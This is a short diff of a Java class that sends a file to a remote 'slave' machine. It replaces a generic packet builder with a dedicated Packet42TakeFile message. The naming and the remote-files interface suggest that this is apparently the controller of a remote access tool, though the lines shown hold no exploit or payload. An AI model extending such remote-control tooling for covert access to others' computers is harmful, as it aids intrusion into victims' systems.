@@ -4,12 +4,10 @@ import java.io.File;
 
 import com.redpois0n.common.io.FileIO;
 import com.redpois0n.common.io.TransferListener;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet42TakeFile;
 import com.redpois0n.ui.frames.FrameFileTransfer;
 import com.redpois0n.ui.frames.FrameRemoteFiles;
 import com.redpois0n.utils.Util;
-
 
 public class SendFile {
 	
@@ -25,16 +23,9 @@ public class SendFile {
 			frame2.start();
 		}
 
-		try {
-			PacketBuilder builder = new PacketBuilder(OutgoingHeader.TAKE_FILE);
-			
-			builder.add(destdir);
-			builder.add(file.getName());
-			
-			slave.addToSendQueue(builder);
-			
-			slave.lock();
-			
+		try {				
+			slave.addToSendQueue(new Packet42TakeFile(destdir, file.getName()));
+					
 			FileIO.writeFile(file, slave.getDataOutputStream(), new TransferListener() {
 				public void transferred(long sent, long bytesSent, long totalBytes) {
 					Traffic.increaseSent(slave, (int) bytesSent);
